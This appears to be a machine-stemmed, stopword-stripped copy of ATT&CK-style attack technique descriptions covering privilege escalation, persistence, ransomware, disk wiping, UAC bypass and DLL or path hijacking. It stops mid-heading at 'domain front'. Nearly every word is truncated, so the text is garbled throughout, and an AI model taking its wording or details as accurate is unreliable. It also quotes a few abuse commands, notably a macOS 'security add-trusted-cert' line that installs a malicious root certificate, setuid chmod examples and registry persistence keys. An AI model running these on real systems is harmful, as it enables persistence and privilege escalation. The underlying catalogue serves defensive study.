advers us sid-history inject esc privileg bypass access control window sec ident sid un valu ident us group account sid us window sec sec describ access tok microsoft sid account hold addit sid sid-history act direct attribut microsoft sid-history attribut allow inter-operable account migr domain valu sid-history includ access tok domain admin equ right harvest well-known sid valu microsoft wel know sid jun 2017 insert sid-history en imperson arbit users/group enterpr admin manip result elev access loc resourc and/or access otherw inaccess domain via lat mov techn remot serv http smb/windows admin shar http window remot man http
network bound bridg
advers bridg network bound comprom perimet network dev intern dev respons network seg breach dev en advers bypass restrict traff rout otherw sep trust untrust network dev rout firewal us cre bound trust untrust network achiev restrict traff typ enforc org policy attempt reduc risk inh connect restrict traff achiev prohibit ip address lay 4 protocol port deep packet inspect ident apply particip rest network dev direct address transp mod op bear advers bypass comprom advers tak control bound dev bypass policy enforc pas norm prohibit traff across trust bound two sep network without hind achiev sufficy right dev advers reconfig dev allow traff want allow achiev goal command control via multi-hop proxy http exfilt dat via traff duply http advers also target intern dev respons network seg abus conjunct intern proxy http achiev goal kaspersky threatneedle feb 2021 cas bord dev sep two sep org advers also facilit lat mov new victim environ
dat encrypt impact
advers encrypt dat target system larg numb system network interrupt avail system network resourc attempt rend stor dat inaccess encrypt fil dat loc remot driv withhold access decrypt key do ord extract monet compens victim exchang decrypt decrypt key ransomw rend dat perm inaccess cas key sav transmit us-cert ransomw 2016 fireey wannacry 2017 us-cert notpety 2017 us-cert samsam 2018 cas ransomw typ common us fil lik off docu pdfs im video audio text sourc cod fil encrypt oft renam and/or tag spec fil mark advers nee first employ behavy fil direct permit mod http system shutdown/reboot http ord unlock and/or gain access manip fil carbonblack cont july 2020 cas advers encrypt crit system fil disk partit mbr us-cert notpety 2017 maxim impact target org malw design encrypt dat worm-like feat prop across network lev attack techn lik valid account http o cred dump http smb/windows admin shar http fireey wannacry 2017 us-cert notpety 2017 encrypt malw also lev intern defac http chang victim wallpap otherw intimid victim send ransom not mess connect print know print bomb nh digit egreg nov 2020 cloud environ stor object within comprom account also encrypt rhino s3 ransomw part 1
disk cont wip
advers eras cont stor dev spec system wel larg numb system network interrupt avail system network resourc advers part complet overwrit cont stor dev rend dat irrecov stor interfac novett blockbust novett blockbust destruct malw doj lazar sony 2018 instead wip spec disk structure fil advers destruct int wip arbit port disk cont wip disk cont advers acquir direct access hard driv ord overwrit arbit siz port disk random dat novett blockbust destruct malw advers observ lev third-party driv lik rawdisk http direct access disk cont novett blockbust novett blockbust destruct malw behavy distinct dat destruct http sect disk eras instead individ fil maxim impact target org op network-wide avail interrupt goal malw us wip disk cont worm-like feat prop across network lev addit techn lik valid account http o cred dump http window admin shar http novett blockbust destruct malw
subvert trust control
advers undermin sec control eith warn us untrust act prev execut untrust program op system sec produc contain mech ident program websit possess level trust exampl feat would includ program allow run sign valid cod sign cert program prompt us warn attribut set download internet get ind connect untrust sit advers attempt subvert trust mech method advers us depend spec mech seek subvert advers conduc fil direct permit mod http mod reg http support subvert control spectorop subvert trust sept 2017 advers also cre ste cod sign cert acquir trust target system securel digit cert symantec digit cert
elev execut prompt
advers lev < cod > authorizationexecutewithprivileg < /code > ap esc privileg prompt us cred appledoc authorizationexecutewithprivileg purpos ap giv apply develop easy way perform op root privileg apply instal upd ap valid program request root privileg com reput sourc malicy mod although ap deprec stil ful funct latest releas maco cal ap us prompt ent cred check origin integr program mak program cal ap also load world writ fil mod perform malicy behavy elev privileg advers abus < cod > authorizationexecutewithprivileg < /code > obtain root privileg ord instal malicy softw victim instal persist mech dea 1000 instal break carbon black shlayer feb 2019 osx coldroot rat techn combin masquerad http trick us grant esc privileg malicy cod dea 1000 instal break carbon black shlayer feb 2019 techn also show work mod legitim program pres machin mak us ap dea 1000 instal break
firmw
advers gath inform victim host firmw us target inform host firmw includ vary detail typ vert spec host us inf inform host environ ex config purpos age/patch level etc. advers gath inform vary way direct elicit via phish inform http inform host firmw expos advers via onlin access dat set ex job post network map assess report resum purchas invo arstechnic intel gath inform rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex supply chain comprom http exploit public-facing apply http
encrypt channel
advers employ know encrypt algorithm cont command control traff rath rely inh protect provid commun protocol despit us sec algorithm impl vuln revers engin secret key encod and/or gen within malw samples/configuration fil
password filt dll
window password filt password policy enforc mech domain loc account filt impl dynam link libr dlls contain method valid pot password password policy filt dlls posit loc comput loc account and/or domain control domain account reg new password sec account man sam loc sec auth lsa request valid reg filt pot chang tak effect every reg filt acknowledg valid advers reg malicy password filt harvest cred loc comput and/or entir domain perform prop valid filt must receiv plain-text cred lsa malicy password filt would receiv plain-text cred every tim password request mak carn own password filt sept 2013
auth pack
advers abus auth pack execut dlls system boot window auth pack dlls load loc sec auth lsa process system start provid support multipl logon process multipl sec protocol op system msdn auth pack advers us autostart mech provid lsa auth pack persist plac ref bin window reg loc < cod > hklm\system\currentcontrolset\control\lsa\ < /code > key valu < cod > auth pack = lt target bin gt < /code > bin execut system auth pack load
regsvr32
advers abus regsvr32.exe proxy execut malicy cod regsvr32.exe command-line program us reg unreg object link emb control includ dynam link libr dlls window system regsvr32.exe bin also sign microsoft microsoft regsvr32 malicy us regsvr32.exe avoid trig sec tool monit execut mod load regsvr32.exe process allowl fals posit window us regsvr32.exe norm op regsvr32.exe also us spec bypass apply control us funct load com scriptlets execut dlls us permit sint regsvr32.exe network proxy aw script load pass uniform resourc loc url fil extern web serv argu invoc method mak chang reg com object act reg execut lolba regsvr32 vary techn oft ref squiblydoo us campaign target govern carbon black squiblydoo apr 2016 fireey regsvr32 target mongol gov regsvr32.exe also lev reg com object us est persist via compon object model hijack http carbon black squiblydoo apr 2016
dat compress
advers compress dat sensit docu collect pri exfilt ord mak port minim amount dat send network compress do sep exfilt channel perform us custom program algorithm common compress libr util 7zip rar zip zlib
cred fil
advers search loc fil system remot fil shar fil contain password fil cre us stor cred shar cred stor group individ config fil contain password system serv sourc code/binary fil contain emb password poss extract password backup sav virt machin o cred dump http cg 2014 password also obtain group policy pref stor window domain control srd gpp cloud environ auth us cred oft stor loc config cred fil cas fil cop reus anoth machin cont read us auth without nee cop fil spect op - cloud cred stor
softw
advers gath inform victim host softw us target inform inst softw includ vary detail typ vert spec host wel pres addit compon might ind ad defend protect ex antivir siem etc. advers gath inform vary way direct collect act via act scan http ex list port serv ban us ag string phish inform http advers also comprom sit includ malicy cont design collect host inform visit scanbox inform inst softw also expos advers via onlin access dat set ex job post network map assess report resum purchas invo gath inform rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex supply chain comprom http extern remot serv http
netsh help dll
netsh.exe also ref netshel command-line script util us interact network config system contain funct ad help dlls extend funct util technet netsh path reg netsh.exe help dlls ent window reg < cod > hklm\software\microsoft\netsh < /code > advers us netsh.exe help dlls proxy execut arbit cod persist man netsh.exe execut autom anoth persist techn persist softw pres system execut netsh.exe part norm funct exampl includ vpn softw invok netsh.exe demask netsh persist proof conceiv cod ex load cobalt strike payload us netsh.exe help dlls github netsh help c beacon
input capt
advers us method capt us input obtain cred collect inform norm system us us oft provid cred vary diff loc login pages/portal system dialog box input capt mech transp us e.g cred ap hook http rely deceiv us provid input believ genuin serv e.g web port capt http
exploit
advers develop exploit us target exploit tak adv bug vuln ord caus unintend unanticip behavy occ comput hardw softw rath finding/modify exploit onlin purchas exploit vend advers develop exploit nytstuxnet advers us inform acquir via vuln http foc exploit develop effort part exploit develop process advers uncov exploit vuln method fuzz patch analys irongeek sim bsid 2017 legitim develop effort diff skil set requir develop exploit skil nee loc in-house nee contract us contract consid extend advers exploit develop cap provid advers play rol shap requir maintain init degr exclud exploit advers us exploit vary phas advers lifecyc i.e exploit public-facing apply http exploit cli execut http exploit privileg esc http exploit defens evas http exploit cred access http exploit remot serv http apply system exploit http
soc med
advers search soc med inform victim us target soc med sit contain vary inform victim org busy annount wel inform rol loc interest staff advers search diff soc med sit depend inform seek gath threat act pass harvest dat sit wel us inform gath cre fak profiles/group elicit victim ’ rev spec inform i.e spearph serv http cyw soc med inform sourc rev opportun form reconnaiss ex phish inform http search op techn databas http est op resourc ex est account http comprom account http and/or init access ex spearph via serv http
compon object model hijack
advers est persist execut malicy cont trig hijack ref compon object model com object com system within window en interact softw compon op system microsoft compon object model ref vary com object stor reg advers us com system insert malicy cod execut plac legitim softw hijack com ref rel mean persist hijack com object requir chang reg replac ref legitim system compon caus compon work execut system compon execut norm system op advers cod execut instead gdat com hijack advers lik hijack object us frequ enough maintain consist level persist unlik break not funct within system avoid system inst could lead detect
cred
advers gath cred us target account cred gath advers direct assocy target victim org attempt tak adv tend us us password across person busy account advers gath cred pot victim vary way direct elicit via phish inform http advers also comprom sit includ malicy cont design collect websit auth cooky visit scanbox cred inform also expos advers via leak onlin access dat set ex search engin http breach dump cod reposit etc. reg deloit reg ub detect slack tok forb github cred github trufflehog github gitrob cnet leak advers also purchas cred dark web black-markets gath inform rev opportun form reconnaiss ex search op websites/domain http phish inform http est op resourc ex comprom account http and/or init access ex extern remot serv http valid account http
comprom softw supply chain
advers manip apply softw pri receipt fin consum purpos dat system comprom supply chain comprom softw tak plac numb way includ manip apply sourc cod manip update/distribution mech softw replac compil releas mod vert target spec desir victim set distribut broad set consum mov addit tact spec victim avast ccleaner3 2018 command fiv sk 2011
renam system util
advers renam legitim system util try evad sec mech concern us util sec monit control mech plac system util advers cap abus lolba main sit poss bypass sec mech renam util pri util ex renam < cod > rundll32.exe < /code > elast masquerad bal altern cas occ legitim util cop mov diff direct renam avoid detect bas system util execut non-standard path f-secure cozyduk
bidirect commun
advers us ex legitim extern web serv mean send command receiv output comprom system web serv channel comprom system lev popul websit soc med host command control c2 instruct infect system send output command back web serv channel return traff occ vary way depend web serv util exampl return traff tak form comprom system post com for issu pul request develop project upd docu host web serv send tweet popul websit soc med act mech c2 giv sign amount cov due lik host within network already commun pri comprom us common serv off googl twit mak easy advers hid expect nois web serv provid common us ssl/tls encrypt giv advers ad level protect
exploit cli execut
advers exploit softw vuln cli apply execut cod vuln ex softw due unsec cod pract lead unanticip behavy advers tak adv certain vuln target exploit purpos arbit cod execut oftentim valu exploit offend toolkit us obtain cod execut remot system us gain access system us expect see fil rel apply common us work us target exploit research develop high util sev typ ex browser-based exploit web brows common target drive-by comprom http spearph link http endpoint system comprom norm web brows certain us target link spearph email advers control sit us exploit web brows oft requir act us exploit execut off apply common off produc apply microsoft off also target phish http malicy fil transmit direct attach link download requir us op docu fil exploit run common third-party apply apply common see part softw deploy target network also us exploit apply adob read flash common enterpr environ routin target advers attempt gain access system depend softw nat vuln exploit brows requir us op fil inst flash exploit del object within microsoft off docu
wordl scan
advers it prob infrastruct us brute-forcing crawl techn techn employ simil method brut forc http goal id cont infrastruct rath discovery valid cred wordl us scan contain gen common us nam fil extend term spec particul softw advers also cre custom target-specific wordl us dat gath reconnaiss techn ex gath victim org inform http search victim-owned websit http exampl advers us web cont discovery tool dirb dirbust gobust gen custom wordl enum websit ’ pag direct clearsky lebanes ced jan 2021 help discov old vuln pag hid admin port could becom target op ex exploit public-facing apply http brut forc http cloud stor solv typ us glob un nam advers also us target-specific wordl tool s3recon gcpbucketbrute enum publ priv bucket cloud infrastruct s3recon github gcpbucketbrute stor object discov advers lev dat cloud stor http access valu inform exfilt us esc privileg mov lat
outlook hom pag
advers abus microsoft outlook hom pag feat obtain persist comprom system outlook hom pag leg feat us custom pres outlook fold feat allow intern extern url load pres whenev fold op malicy html pag craft execut cod load outlook hom pag sensepost outlook hom pag malicy hom pag ad us ’ mailbox load outlook start malicy hom pag execut right outlook fold loaded/reload sensepost outlook hom pag
asymmet cryptograph
advers employ know asymmet encrypt algorithm cont command control traff rath rely inh protect provid commun protocol asymmet cryptograph also know publ key cryptograph us keypair per party on publ fre distribut on priv due key gen send encrypt dat receiv ’ publ key receiv decrypt dat priv key ens intend recipy read encrypt dat common publ key encrypt algorithm includ rsa elgam efficy many protocol includ ssl/tls us symmet cryptograph connect est us asymmet cryptograph est transmit key protocol class asymmet cryptograph http
exfilt cloud stor
advers exfilt dat cloud stor serv rath prim command control channel cloud stor serv allow stor edit retriev dat remot cloud stor serv internet exampl cloud stor serv includ dropbox googl doc exfilt cloud stor serv provid sign amount cov advers host within network already commun serv
lat tool transf
advers transf tool fil system comprom environ bring victim environ i.e ingr tool transf http fil cop on system anoth stag advers tool fil cours op advers cop fil intern victim system support lat mov us inh fil shar protocol fil shar smb/windows admin shar http connect network shar auth connect via remot desktop protocol http unit42 lockergog 2019 fil also transf us nat otherw pres tool victim system scp rsynt curl sftp ftp http
path interceiv unquot path
advers execut malicy payload hijack vuln fil path ref advers tak adv path lack surround quot plac execut high level direct within path window choos advers execut launch serv path microsoft currentcontrolset serv shortcut path also vuln path interceiv path on spac surround quot mark < cod > c \unsafe path space\program.ex < /code > vs. < cod > c \safe path space\program.ex < /code > help elimin unquot path stor window reg key advers plac execut high level direct path window resolv execut instead intend execut exampl path shortcut < cod > c \program files\myapp.exe < /code > advers cre program < cod > c \program.exe < /code > run instead intend program window unquot serv window privileg esc guid techn us persist execut cal regul bas wel privileg esc interceiv execut start high privileg process
instal digit cert
advers instal ssl/tls cert us target ssl/tls cert fil inst serv en sec commun system digit cert includ inform key inform own id digit sign ent ver cert cont correct sign valid person examin cert trust sign know us key commun sec own cert upload serv serv config us cert en encrypt commun digicert instal ssl cert advers instal ssl/tls cert us op encrypt c2 traff ex asymmet cryptograph http web protocol http lend cred cred harvest sit instal digit cert tak plac numb serv typ includ web serv email serv advers obtain digit cert see digit cert http cre self-signed cert see digit cert http digit cert inst advers control infrastruct acquir acquir infrastruct http prevy comprom comprom infrastruct http
loc job schedule
linux maco system multipl method support cre pre-scheduled period background job cron die.net linux crontab man pag die.net linux man pag launchd appledoc schedule tim job unlik schedule task/job http window system job schedule linux-based system do remot unless us conjunct within est remot sess lik sec shel ssh cron system-wide cron job inst mod < cod > /etc/crontab < /code > fil < cod > /etc/cron.d/ < /code > direct loc support cron daemon per-us cron job inst us crontab spec form crontab fil appledoc schedule tim job work maco linux system method allow command script execut spec period interv background without us interact advers us job schedule execut program system startup schedule bas persist janicab method mac malw persist malw persist o x avast linux trod cron persist conduc execut part lat mov gain root privileg run process context spec account program anoth mean posix-based system includ maco linux schedule program script job execut lat dat and/or tim could also us purpos launchd launchd job describ diff config property list plist fil simil launch daemon http launch ag http exceiv addit key cal < cod > startcalendarinterv < /code > dict tim valu appledoc schedule tim job work maco o x
setuid setgid
setuid setgid bit set linux maco apply mean apply run privileg own us group respect setuid man pag norm apply run cur us ’ context regardless us group own apply inst program nee execut elev context funct prop us run ’ nee elev privileg instead cre entry sudo fil must do root us spec setuid setgid flag set apply bit ind instead x view fil attribut via < cod > l -l < /code > < cod > chmod < /code > program set bit via bitmask < cod > chmod 4777 fil < /code > via shorthand nam < cod > chmod u+s fil < /code > advers tak adv eith shel escap exploit vuln apply setsuid setgid bit get cod run diff us ’ context addit advers us mech malw mak sur 're abl execut elev context fut osx keydnap malw
startup item
advers us startup item autom execut boot init est persist startup item execut fin phas boot process contain shel script execut fil along config inform us system determin execut ord startup item startup item techn deprec technolog supers launch daemon http thu appropry fold < cod > /library/startupitems < /code > ’ guar ex system default appear ex default maco sierr startup item direct whos execut config property list plist < cod > startupparameters.plist < /code > resid top-level direct advers cre appropry folders/file startupitem direct reg persist mech method mac malw persist addit sint startupitem run bootup phas maco run elev root us
web shel
web shel web script plac op access web serv allow advers us web serv gateway network web shel provid set funct execut command-line interfac system host web serv addit server-side script web shel cli interfac program us talk web serv see exampl chin chop web shel cli lee 2013 web shel serv redund access http persist mech cas advers prim access method detect remov
process doppelgäng
window transact ntfs txf introduc vist method perform saf fil op microsoft txf ens dat integr txf en on transact handl writ fil giv tim writ handl transact termin handl isol writ read commit vert fil ex tim handl op microsoft bas txf conceiv avoid corrupt txf perform autom rollback system apply fail writ transact microsoft us txf although deprec txf apply program interfac ap stil en window 10 blackh process doppelgäng dec 2017 advers lev txf perform file-less vary process inject http cal process doppelgäng simil process hollow http process doppelgäng involv replac mem legitim process en veil execut malicy cod evad defens detect process doppelgäng us txf also avoid us highly-monitored ap funct ntunmapviewofsect virtualprotectex setthreadcontext blackh process doppelgäng dec 2017 process doppelgäng impl 4 step blackh process doppelgäng dec 2017 transact – cre txf transact us legitim execut overwrit fil malicy cod chang isol vis within context transact load – cre shar sect mem load malicy execut rollback – undo chang origin execut effect remov malicy cod fil system anim – cre process taint sect mem in execut
ssh hijack
sec shel ssh standard mean remot access linux maco system allow us connect anoth system via encrypt tunnel common auth password cert us asymmet encrypt key pair ord mov lat comprom host advers tak adv trust rel est system via publ key auth act ssh sess hijack ex connect anoth system occ comprom ssh ag access ag socket advers abl obtain root access hijack ssh sess lik triv slidesh abus ssh sshjack blackh clockwork ssh ag hijack comprom ssh ag also provid access interceiv ssh cred welivesec ebury ssh ssh hijack http diff us remot serv http inject ex ssh sess rath cre new sess us valid account http
system langu discovery
advers attempt gath inform system langu victim ord inf geograph loc host inform us shap follow-on behavy includ wheth advers infect target and/or attempt spec act decid employ malw develop op reduc risk attract at spec law enforc ag prosecution/scrutiny ent malw system langu check vary sourc dat advers could us inf system langu system default keyboard layout spec check vary bas target and/or advers involv behavy query reg http cal nat ap http funct crowdstrik ryuk janu 2019 exampl window system advers attempt inf langu system query reg key < cod > hkey_local_machine\system\currentcontrolset\control\nls\language < /code > pars output window ap funct < cod > getuserdefaultuilangu < /code > < cod > getsystemdefaultuilangu < /code > < cod > getkeyboardlayoutl < /code > < cod > getuserdefaultlangid < /code > darksid ransomw cybereason securel jsworm securel synack doppelgäng 2018 maco linux system advers query < cod > loc < /code > retriev valu < cod > lang < /code > environ vary
non-applicat lay protocol
advers us non-applicat lay protocol commun host c2 serv among infect host within network list poss protocol extend wikiped os spec exampl includ us network lay protocol internet control mess protocol icmp transport lay protocol us datagram protocol udp sess lay protocol socket sec sock wel redirected/tunnel protocol ser lan sol icmp commun host on exampl cisco syn knock evolv icmp part internet protocol suit requir impl ip-compatible host microsoft icmp howev common monit internet protocol tcp udp us advers hid commun
pas hash
pas hash pth method auth us without access us cleartext password method bypass standard auth step requir cleartext password mov direct port auth us password hash techn valid password hash account us capt us cred access techn capt hash us pth auth us auth pth us perform act loc remot system window 7 high kb2871997 requir valid domain us cred rid 500 admin hash nsa spot
steganograph
advers us steganograph techn ord prev detect hid inform steganograph techn us hid dat digit med im audio track video clip text fil duqu http ear exampl malw us steganograph encrypt gath inform victim system hid within im exfilt im c2 serv wikiped duqu end 2017 threat group us < cod > invoke-psimag < /code > hid powershel http command im fil .png execut cod victim system particul cas powershel http cod download anoth obfusc script gath intellig victim machin commun back advers mcaf malicy doc target pyeongchang olymp
dns serv
advers comprom third-party dns serv us target post-compromise act advers util dns traff vary task includ command control ex apply lay protocol http instead set dns serv advers comprom third-party dns serv support op comprom dns serv advers alt dns record control allow redirect org traff facilit collect cred access effort advers talo dnspionage nov 2018 fireey dns hijack 2019 addit advers lev control conjunct digit cert http redirect traff adversary-controlled infrastruct mim norm trust network commun fireey dns hijack 2019 crowdstrik dns hijack 2019 advers also abl sil cre subdomain point malicy serv without tip act own dns serv ciscoangl proofpoint domain shadow
protocol imperson
advers imperson legitim protocol web serv traff disgu command control act thwart analys effort imperson legitim protocol web serv advers mak command control traff blend legitim network traff advers imperson fak ssl/tls handshak mak look lik subsequ traff ssl/tls encrypt pot interf sec tool mak traff look lik rel trust ent
query reg
advers interact window reg gath inform system config inst softw reg contain sign amount inform op system config softw sec wikiped window reg inform easy query us reg http util though mean access reg ex inform help advers op within network advers us inform query reg http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act
dat transf siz limit
advers exfilt dat fix siz chunk instead whol fil limit packet siz certain threshold approach us avoid trig network dat transf threshold alert
window remot man
window remot man winrm nam window serv protocol allow us interact remot system run execut mod reg mod serv microsoft winrm cal < cod > winrm < /code > command numb program powershel jacobs 2014
web sess cooky
advers us ste sess cooky auth web apply serv techn bypass multi-factor auth protocol sint sess already auth pas cooky auth cooky common us web apply includ cloud-bas serv us auth serv cred pass re-authentication nee occ frequ cooky oft valid extend period tim ev web apply act us cooky obtain ste web sess cooky http web cooky http advers import cooky brows control abl us sit apply us long sess cooky act log sit advers access sensit inform read email perform act victim account permit perform exampl malw target sess cooky bypass multi-factor auth system unit 42 mac crypto cooky janu 2019
domain account
advers obtain abus cred domain account mean gain init access persist privileg esc defens evas technet cred theft domain account man act direct domain serv access permit config across system serv part domain domain account cov us admin serv microsoft ad account advers comprom domain account high level privileg vary mean o cred dump http password reus allow access privileg resourc domain
regsvcs/regasm
advers abus regsvc regasm proxy execut cod trust window util regsvc regasm window command-line util us reg .net compon object model http com assembl bin digit sign microsoft msdn regsvc msdn regasm util us bypass apply control us attribut within bin spec cod run reg unreg < cod > comregisterfunct < /code > < cod > comunregisterfunct < /code > respect cod reg unreg attribut execut ev process run insufficy privileg fail execut lolba regsvc lolba regasm
path interceiv
techn deprec pleas us path interceiv path environ vary http path interceiv search ord hijack http and/or path interceiv unquot path http path interceiv occ execut plac spec path execut apply instead intend target on exampl us cop cmd http cur work direct vuln apply load cmd bat fil createprocess funct technet ms14-019 multipl distinct weak misconfig advers tak adv perform path interceiv unquot path path environ vary misconfig search ord hijack first vuln deal ful program path second third occ program path spec techn us persist execut cal regul bas wel privileg esc interceiv execut start high privileg process unquot path serv path stor window reg key microsoft subkey shortcut path vuln path interceiv path on spac surround quot mark < cod > c \unsafe path space\program.ex < /code > vs. < cod > c \safe path space\program.ex < /code > bagget 2012 advers plac execut high level direct path window resolv execut instead intend execut exampl path shortcut < cod > c \program files\myapp.exe < /code > advers cre program < cod > c \program.exe < /code > run instead intend program securityboulevard unquot serv apr 2018 sploitspren window priv jan 2018 path environ vary misconfig path environ vary contain list direct certain method execut program nam us cmd.exe command-line rely sol path environ vary determin loc search program path program giv direct list path environ vary window direct < cod > systemroot \system32 < /code > < cod > c \windows\system32 < /code > program plac prec direct nam window program cmd powershel python execut command execut script command-line exampl < cod > c \example path < /code > prec < cod > c \windows\system32 < /code > path environ vary program nam net.exe plac < cod > c \example path < /code > cal instead window system net net execut command-line search ord hijack search ord hijack occ advers abus ord window search program giv path search ord diff depend method us execut program microsoft createprocess hil nt shel microsoft winexec howev common window search direct in program search window system direct advers find program vuln search ord hijack i.e. program spec path execut tak adv vuln cre program nam improp spec program plac within in program direct exampl example.ex run cmd.exe command-line argu < cod > net us < /code > advers plac program cal net.exe within direct example.ex net.exe run instead window system util net addit advers plac program cal net.com direct net.exe < cod > cmd.exe /c net us < /code > execut net.com instead net.exe due ord execut extend defin pathext msdn environ property search ord hijack also common pract hijack dll load cov dll search ord hijack http
web sess cooky
advers us ste sess cooky auth web apply serv techn bypass multi-factor auth protocol sint sess already auth pas cooky auth cooky common us web apply includ cloud-bas serv us auth serv cred pass re-authentication nee occ frequ cooky oft valid extend period tim ev web apply act us cooky obtain ste web sess cooky http advers import cooky brows control abl us sit apply us long sess cooky act log sit advers access sensit inform read email perform act victim account permit perform exampl malw target sess cooky bypass multi-factor auth system unit 42 mac crypto cooky janu 2019
instal root cert
advers instal root cert comprom system avoid warn connect advers control web serv root cert us publ key cryptograph ident root cert auth ca root cert inst system apply trust cert root chain trust sign root cert wikiped root cert cert common us est sec tls/ssl commun within web brows us attempt brows websit pres cert trust er mess display warn us sec risk depend sec set brows allow us est connect websit instal root cert comprom system would giv advers way degrad sec system advers us techn avoid sec warn prompt us comprom system connect http advers control web serv spoof legitim websit ord collect login cred op em atyp root cert also pre-installed system manufact softw supply chain us conjunct malware/adwar provid adversary-in-the-middle http cap interceiv inform transmit sec tls/ssl commun kaspersky superf root cert assocy chain also clon reinstal clon cert chain carry many metadat charact sourc us sign malicy cod bypass sign valid tool ex sysintern antivir etc us block execut and/or uncov artifact persist spectorop cod sign dec 2017 maco ay mam malw us < cod > /usr/bin/security add-trusted-cert -d -r trustroot -k /library/keychains/system.keychain /path/to/malicious/cert < /code > instal malicy cert trust root cert system keychain objective-s ay mam 2018
network logon script
advers us network logon script autom execut logon init est persist network logon script assign us act direct group policy object petr logon script ad logon script run privileg us assign depend system within network init on script could apply on pot system advers us script maintain persist network depend access config logon script eith loc cred admin account necess
endpoint den serv
advers perform endpoint den serv do attack degrad block avail serv us endpoint do perform exhaust system resourc serv host exploit system caus persist crash condit exampl serv includ websit email serv dns web-based apply advers observ conduc do attack polit purpos fireey oppoisonedhandov febru 2016 support malicy act includ distract fsisac fraudnetdo septemb 2012 hackt extort symantec ddo octob 2014 endpoint do deny avail serv without sat network us provid access serv advers target vary lay apply stack host system us provid serv lay includ op system o serv apply web serv dns serv databas typ web-based apply sit top attack lay requir diff techn tak adv bottleneck un respect compon do attack gen singl system multipl system spread across internet common ref distribut do ddo perform do attack endpoint resourc sev aspect apply multipl method includ ip address spoof botnet advers us origin ip address attack system spoof sourc ip address mak attack traff difficult trac back attack system en reflect increas difficul defend defend attack reduc elimin effect filt sourc address network defens dev botnet common us conduc ddo attack network serv larg botnet gen sign amount traff system spread across glob internet advers resourc build control botnet infrastruct rent tim ex botnet conduc attack worst cas ddo many system us gen request on nee send smal amount traff produc enough volum exhaust target resourc circumst distinct ddo traff legitim cli becom excess difficult botnet us high-profile ddo attack 2012 sery incid target maj u bank usny iranianbotnet march 2016 cas traff manip us point glob network high traff gateway rout packet alt caus legitim cli execut cod direct network packet toward target high volum typ cap prevy us purpos web cens cli http traff mod includ ref javascrib gen ddo cod overwhelm target web serv arstechnic gre firewal chin attack attempt sat provid network see network den serv http
compil delivery
advers attempt mak payload difficult discov analys del fil victim uncompil cod text-based sourc cod fil subvert analys scrutiny protect target executables/binary payload nee compil execut typ via nat util csc.exe gcc/mingw clearsky muddyw nov 2018 sourc cod payload also encrypt encod and/or emb within fil del phish http payload also del form unrecogn inh benign nat o ex ex macos/linux lat compil prop execut bin bundl compil execut framework trendmicro windowsappmac
uncommon us port
advers conduc c2 commun non-standard port bypass proxy firewal improp config
system loc discovery
advers gath inform attempt calc geograph loc victim host advers us inform system loc discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act advers attempt inf loc system us vary system check tim zon keyboard layout and/or langu set fbi ragn lock 2020 sopho geoloc 2016 bleepingcomput rat malw 2020 window ap funct < cod > getlocaleinfow < /code > also us determin loc host fbi ragn lock 2020 cloud environ inst avail zon also discov access inst metadat serv inst aw inst id docu microsoft az inst metadat 2021 advers also attempt inf loc victim host us ip address via onlin geoloc ip-lookup serv securel trasp trib 2020 sopho geoloc 2016
vba stomp
advers hid malicy vis bas apply vba payload emb within m off docu replac vba sourc cod benign dat fireey vba stomp feb 2020 m off docu emb vba cont stor sourc cod insid mod stream mod stream < cod > performancecach < /code > stor sep compil vert vba sourc cod know p-code p-code execut m off vert spec < cod > _vba_project < /code > stream contain version-dependent describ vba project match vert host m off apply evil clippy 2019 microsoft _vba_project stream advers hid malicy vba cod overwrit vba sourc cod loc zero ’ benign cod random byt leav prevy compil malicy p-code tool scan malicy vba sourc cod bypass unw cod hid compil p-code vba sourc cod remov tool might ev think macro pres vert match < cod > _vba_project < /code > stream host m off apply p-code execut otherw benign vba sourc cod decompress recompil p-code thu remov malicy p-code pot bypass dynam analys walmart robert oct 2018 fireey vba stomp feb 2020 pcodedmp bontchev
bit job
advers abus bit job persist execut cod perform vary background task window background intellig transf serv bit low-bandwidth asynchron fil transf mech expos compon object model http com microsoft com microsoft bit bit common us upd messeng apply pref op background us avail idl bandwid without interrupt network apply fil transf task impl bit job contain queu on fil op interfac cre man bit job access powershel http bitsadmin http tool microsoft bit microsoft bitsadmin advers abus bit download e.g ingr tool transf http execut ev cle run malicy cod e.g ind remov http bit task self-contained bit job databas without new fil reg mod oft permit host firewal ctu bit malw jun 2016 mondok window piggyback bit 2007 symantec bit 2007 bit en execut also en persist cre long-stand job default maxim lifetim 90 day extend invok arbit program job complet er includ system reboot paloalto ubo nov 2017 ctu bit malw jun 2016 bit upload funct also us perform exfilt altern protocol http ctu bit malw jun 2016
msbuild
advers us msbuild proxy execut cod trust window util msbuild.exe microsoft build engin softw build platform us vis studio handl xml form project fil defin requir load build vary platform config msdn msbuild advers abus msbuild proxy execut malicy cod inlin task cap msbuild introduc .net vert 4 allow c vis bas cod insert xml project fil msdn msbuild microsoft msbuild inlin task 2017 msbuild compil execut inlin task msbuild.exe sign microsoft bin us way execut arbit cod bypass apply control defens config allow msbuild.exe execut lolba msbuild
bypass us account control
window us account control uac allow program elev privileg perform task administrator-level permit prompt us confirm impact us rang deny op high enforc allow us perform act loc admin group click prompt allow ent admin password complet act technet uac work uac protect level comput set anyth highest level certain window program allow elev privileg execut elev com object without prompt us uac not box technet insid uac msdn com elev exampl us rundll32.exe load spec craft dll load auto-elevated com object perform fil op protect direct would typ requir elev access malicy softw also inject trust process gain elev privileg without prompt us davidson window advers us techn elev privileg admin target process unprotect many method discov bypass uac github readm pag uacm contain extend list method github uacm discov impl within uacm comprehend list bypass addit bypass method regul discov us wild < cod > eventvwr.exe < /code > auto-elevate execut spec bin script enigma0x3 fileless uac bypass fortinet fareit anoth bypass poss lat mov techn cred account admin privileg know sint uac singl system sec mech privileg integr process run on system unknown lat system default high integr san uac bypass
runtim dat manip
advers mod system ord manip dat access display end us fireey apt38 oct 2018 doj lazar sony 2018 manip runtim dat advers attempt affect busy process org understand decid mak advers alt apply bin us display dat ord caus runtim manip advers also conduc chang default fil assocy http masquerad http caus simil effect typ mod impact depend target apply process wel goal object advers complex system advers would lik nee spec expert poss access spec softw rel system would typ gain prolong inform gath campaign ord desir impact
domain front
